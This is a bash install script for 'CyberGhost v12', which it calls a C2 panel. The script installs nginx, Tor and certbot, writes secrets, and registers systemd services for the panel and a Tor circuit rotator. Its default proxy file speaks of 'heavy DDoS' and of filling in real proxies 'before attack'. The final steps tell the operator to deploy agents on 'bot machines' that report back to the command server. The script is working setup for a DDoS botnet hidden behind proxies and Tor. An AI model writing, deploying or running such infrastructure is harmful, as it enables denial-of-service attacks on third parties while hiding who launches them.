#!/usr/bin/env bash
set -uo pipefail
# NOTE: sengaja tanpa -e. Satu apt repo rusak (mis. ookla 404) tidak boleh
#       mematikan seluruh install. Setiap langkah kritikal punya die() eksplisit.

DOMAIN="${1:-}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
APP_DIR="${CG_APP_DIR:-$SCRIPT_DIR}"
PY="python3.11"

log()  { echo "[+] $*"; }
warn() { echo "[!] $*" >&2; }
die()  { echo "[x] $*" >&2; exit 1; }

if [ "$(id -u)" -ne 0 ]; then
  die "must run as root: sudo bash install.sh${DOMAIN:+ $DOMAIN}"
fi

# ============================================================
# 0. disable broken apt repos (ookla speedtest 404)
# ============================================================
if [ -f /etc/apt/sources.list.d/ookla_speedtest-cli.list ]; then
  warn "disabling broken ookla repo"
  mv /etc/apt/sources.list.d/ookla_speedtest-cli.list \
     /etc/apt/sources.list.d/ookla_speedtest-cli.list.disabled 2>/dev/null || true
fi
if grep -rqs "packagecloud.io/ookla" /etc/apt/sources.list /etc/apt/sources.list.d/; then
  warn "commenting ookla repo lines"
  grep -rls "packagecloud.io/ookla" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null \
    | xargs -r sed -i 's|^[[:space:]]*deb[[:space:]]|#deb |'
fi

# ============================================================
# 1. python 3.11
# ============================================================
if ! command -v "$PY" >/dev/null 2>&1; then
  log "installing $PY"
  apt-get update -qq || warn "apt update had errors (ignored)"
  apt-get install -y software-properties-common || die "cannot install software-properties-common"
  add-apt-repository -y ppa:deadsnakes/ppa || warn "deadsnakes ppa failed"
  apt-get update -qq || true
  apt-get install -y python3.11 python3.11-venv python3.11-dev || \
    die "$PY not installable — install manually then re-run"
fi
command -v "$PY" >/dev/null || die "$PY still missing after install"

# ============================================================
# 2. system deps
# ============================================================
apt-get update -qq || warn "apt update errors (ignored)"
apt-get install -y python3-pip nginx tor certbot python3-certbot-nginx || \
  die "system deps install failed (nginx, tor, certbot)"

systemctl enable --now tor || warn "tor.service failed to start (optional)"

# ============================================================
# 3. app dir + venv
# ============================================================
log "installing into $APP_DIR"
mkdir -p "$APP_DIR"
cd "$APP_DIR"

[ -f requirements.txt ] || die "requirements.txt not found in $APP_DIR"
[ -f app.py ]           || die "app.py not found in $APP_DIR"
[ -f tor.py ]           || warn "tor.py not found (optional, gateway features disabled)"

if [ ! -d "$APP_DIR/venv" ]; then
  "$PY" -m venv venv || die "venv create failed"
fi
./venv/bin/pip install --upgrade pip wheel setuptools -q || die "pip upgrade failed"

log "installing python deps (this takes ~1-2 min)"
./venv/bin/pip install -r requirements.txt || die "pip install -r requirements.txt FAILED"

# ============================================================
# 3b. verify passlib+bcrypt compatibility — CRITICAL
# ============================================================
log "verifying passlib + bcrypt compatibility"
HASH_TEST=$(./venv/bin/python - <<'PYEOF' 2>/dev/null
import sys
try:
    from passlib.context import CryptContext
    ctx = CryptContext(schemes=["bcrypt"], deprecated="auto")
    h = ctx.hash("test_pass_12345")
    if not h.startswith("$2"):
        print("BAD_FORMAT:" + h[:40]); sys.exit(2)
    if not ctx.verify("test_pass_12345", h):
        print("VERIFY_FAIL"); sys.exit(3)
    print("OK:" + h[:12])
except AttributeError as e:
    print("BCRYPT_INCOMPAT:" + str(e)); sys.exit(4)
except ValueError as e:
    print("BCRYPT_VALUEERR:" + str(e)); sys.exit(5)
except Exception as e:
    print("UNKNOWN:" + type(e).__name__ + ":" + str(e)); sys.exit(6)
PYEOF
)
HASH_RC=$?
if [ "$HASH_RC" -ne 0 ] || ! echo "$HASH_TEST" | grep -q "^OK:"; then
  warn "passlib/bcrypt test failed: $HASH_TEST"
  warn "attempting auto-fix: pin bcrypt==4.0.1"
  ./venv/bin/pip install --force-reinstall --no-cache-dir "bcrypt==4.0.1" -q || \
    die "bcrypt downgrade failed"
  HASH_TEST=$(./venv/bin/python - <<'PYEOF' 2>/dev/null
from passlib.context import CryptContext
ctx = CryptContext(schemes=["bcrypt"], deprecated="auto")
h = ctx.hash("test_pass_12345")
assert ctx.verify("test_pass_12345", h)
print("OK:" + h[:12])
PYEOF
)
  if ! echo "$HASH_TEST" | grep -q "^OK:"; then
    die "passlib/bcrypt STILL broken after downgrade: $HASH_TEST
Fix manually: ./venv/bin/pip install 'bcrypt==4.0.1' 'passlib==1.7.4'
Then re-run install.sh"
  fi
fi
log "passlib+bcrypt OK"

# ============================================================
# 4. proxies.txt default
# ============================================================
if [ ! -f "$APP_DIR/proxies.txt" ]; then
  cat > "$APP_DIR/proxies.txt" <<'EOF'
# Proxy pool — format: scheme://[user:pass@]host:port
# Supported schemes: socks5, socks5h, socks4, http, https
#
# Example (fill with your own):
# socks5://user:pass@1.2.3.4:1080
# http://user:pass@5.6.7.8:8080
# socks5h://9.10.11.12:1080
#
# For heavy DDoS: buy rotating residential proxy from Bright Data / Oxylabs /
# Smartproxy and paste the endpoint format they give you here.
EOF
  log "created default proxies.txt — populate with real proxies before attack"
fi

# ============================================================
# 5. admin password — with strict validation
# ============================================================
ADMIN_HASH_VAL="${CG_ADMIN_HASH:-}"
if [ -z "$ADMIN_HASH_VAL" ]; then
  echo
  echo "=========================================="
  echo " Admin login setup"
  echo "=========================================="
  printf "Admin username (default: ghost): "
  read -r ADMIN_USER_IN
  ADMIN_USER_VAL="${ADMIN_USER_IN:-ghost}"

  printf "Admin password (min 8 char, max 72 bytes, empty = skip): "
  read -sr ADMIN_PASS_IN
  echo

  if [ -n "$ADMIN_PASS_IN" ]; then
    if [ ${#ADMIN_PASS_IN} -lt 8 ]; then
      die "password too short (min 8 char)"
    fi
    if [ ${#ADMIN_PASS_IN} -gt 72 ]; then
      die "password >72 bytes — bcrypt limit. Use shorter password."
    fi
    ADMIN_HASH_VAL=$(CG_ADMIN_PASS="$ADMIN_PASS_IN" ./venv/bin/python -c \
      "import os; from passlib.context import CryptContext; print(CryptContext(schemes=['bcrypt'], deprecated='auto').hash(os.environ['CG_ADMIN_PASS']))" 2>/dev/null)
    RC=$?
    if [ "$RC" -ne 0 ] || [ -z "$ADMIN_HASH_VAL" ]; then
      die "admin hash generation FAILED (rc=$RC). 
       Check: ./venv/bin/pip list | grep -E 'bcrypt|passlib'
       Should show: bcrypt 4.0.1, passlib 1.7.4"
    fi
    case "$ADMIN_HASH_VAL" in
      \$2a\$*|\$2b\$*|\$2y\$*) : ;;
      *) die "admin hash format invalid: ${ADMIN_HASH_VAL:0:20}..." ;;
    esac
    log "admin hash generated: ${ADMIN_HASH_VAL:0:12}..."
  fi
else
  ADMIN_USER_VAL="${CG_ADMIN_USER:-ghost}"
  log "using provided CG_ADMIN_HASH"
fi

if [ -z "$ADMIN_HASH_VAL" ]; then
  warn "NO ADMIN HASH — panel login will be REJECTED until you set CG_ADMIN_HASH in $APP_DIR/.env"
  warn "To generate later:"
  warn "  $APP_DIR/venv/bin/python -c \"from passlib.context import CryptContext; print(CryptContext(schemes=['bcrypt']).hash('YOUR_PASS'))\""
  warn "  then edit $APP_DIR/.env line CG_ADMIN_HASH=..."
fi

JWT_SECRET_VAL="${CG_JWT_SECRET:-$(openssl rand -hex 32)}"
AGENT_SECRET_VAL="${CG_AGENT_SECRET:-$(openssl rand -hex 32)}"

# ============================================================
# 6. write .env
# ============================================================
cat > "$APP_DIR/.env" <<EOF
CG_APP_DIR=$APP_DIR
CG_ADMIN_USER=$ADMIN_USER_VAL
CG_ADMIN_HASH=$ADMIN_HASH_VAL
CG_JWT_SECRET=$JWT_SECRET_VAL
CG_AGENT_SECRET=$AGENT_SECRET_VAL
CG_TLS_CERT=/etc/letsencrypt/live/${DOMAIN:-c2.local}/fullchain.pem
CG_TLS_KEY=/etc/letsencrypt/live/${DOMAIN:-c2.local}/privkey.pem
CG_REQUIRE_TLS=${CG_REQUIRE_TLS:-1}
CG_REQUIRE_PROXY=${CG_REQUIRE_PROXY:-0}
CG_USE_TOR=${CG_USE_TOR:-0}
CG_TOR_GATEWAY=${CG_TOR_GATEWAY:-socks5://127.0.0.1:9050}
CG_PROXIES_FILE=$APP_DIR/proxies.txt
CG_DB=$APP_DIR/cyberghost.db
CG_LOG=$APP_DIR/cyberghost.log
CG_DOMAIN=${DOMAIN:-}
EOF
chmod 600 "$APP_DIR/.env"
log "wrote $APP_DIR/.env (chmod 600)"

# ============================================================
# 7. systemd units
# ============================================================
cat > /etc/systemd/system/cyberghost.service <<EOF
[Unit]
Description=CyberGhost C2 Panel
After=network.target tor.service

[Service]
Type=simple
WorkingDirectory=$APP_DIR
EnvironmentFile=$APP_DIR/.env
ExecStart=$APP_DIR/venv/bin/python $APP_DIR/app.py --workers 4
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

if [ -f "$APP_DIR/tor.py" ]; then
cat > /etc/systemd/system/cyberghost-tor.service <<EOF
[Unit]
Description=CyberGhost Tor Circuit Rotator
After=tor.service

[Service]
Type=simple
WorkingDirectory=$APP_DIR
ExecStart=$APP_DIR/venv/bin/python $APP_DIR/tor.py --mode rotate --interval 30
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
fi

systemctl daemon-reload
systemctl enable cyberghost || warn "enable cyberghost failed"
[ -f "$APP_DIR/tor.py" ] && systemctl enable cyberghost-tor || true

# ============================================================
# 8. nginx
# ============================================================
if [ -n "$DOMAIN" ]; then
cat > /etc/nginx/sites-available/cyberghost <<EOF
server {
    listen 80;
    server_name $DOMAIN;
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }
}
EOF
else
cat > /etc/nginx/sites-available/cyberghost <<EOF
server {
    listen 80 default_server;
    server_name _;
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }
}
EOF
fi

ln -sf /etc/nginx/sites-available/cyberghost /etc/nginx/sites-enabled/cyberghost
rm -f /etc/nginx/sites-enabled/default
nginx -t 2>/dev/null && systemctl reload nginx || warn "nginx reload failed — check: nginx -t"

if [ -n "$DOMAIN" ]; then
  certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos \
    --register-unsafely-without-email 2>/dev/null || \
    warn "certbot failed — panel live on http://$DOMAIN (no TLS yet)"
fi

# ============================================================
# 9. start service
# ============================================================
systemctl restart cyberghost
sleep 2
if ! systemctl is-active --quiet cyberghost; then
  warn "cyberghost.service NOT RUNNING — last 20 log lines:"
  journalctl -u cyberghost -n 20 --no-pager >&2 || true
  warn "check manually: systemctl status cyberghost"
fi

if [ -f "$APP_DIR/tor.py" ] && systemctl is-enabled --quiet cyberghost-tor 2>/dev/null; then
  systemctl restart cyberghost-tor || warn "cyberghost-tor failed (non-fatal)"
fi

# ============================================================
# 10. summary
# ============================================================
SERVER_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$SERVER_IP" ] && SERVER_IP="SERVER_IP"
PANEL_URL="http://$SERVER_IP"
[ -n "$DOMAIN" ] && PANEL_URL="https://$DOMAIN"

echo
echo "=========================================="
echo " CyberGhost v12 — install complete"
echo "=========================================="
echo " APP_DIR:       $APP_DIR"
echo " Panel:         $PANEL_URL"
echo " Admin user:    $ADMIN_USER_VAL"
echo " Admin hash:    $([ -n "$ADMIN_HASH_VAL" ] && echo "SET (${#ADMIN_HASH_VAL} chars)" || echo "EMPTY — login disabled")"
echo " Start script:  bash $APP_DIR/start.sh"
echo " Systemd:       systemctl status cyberghost"
echo " Logs:          journalctl -u cyberghost -f"
echo
echo " Next steps:"
echo "   1. Login at $PANEL_URL"
echo "   2. Generate agent token:"
echo "      $APP_DIR/venv/bin/python $APP_DIR/app.py --gen-token bot01"
echo "   3. Populate $APP_DIR/proxies.txt with real proxies"
echo "   4. Deploy agent on bot machines:"
echo "      python app.py --agent --c2 wss://$DOMAIN --token 'bot01.<hmac>' --workers 4"
echo "=========================================="

if [ -z "$ADMIN_HASH_VAL" ]; then
  echo
  echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  echo " WARNING: ADMIN HASH EMPTY"
  echo " Panel will REJECT all logins."
  echo " Fix:"
  echo "   1. Generate hash:"
  echo "      $APP_DIR/venv/bin/python -c \\"
  echo "        \"from passlib.context import CryptContext; print(CryptContext(schemes=['bcrypt']).hash('YOUR_PASS'))\""
  echo "   2. Edit $APP_DIR/.env — set CG_ADMIN_HASH=<hash>"
  echo "   3. systemctl restart cyberghost"
  echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
fi
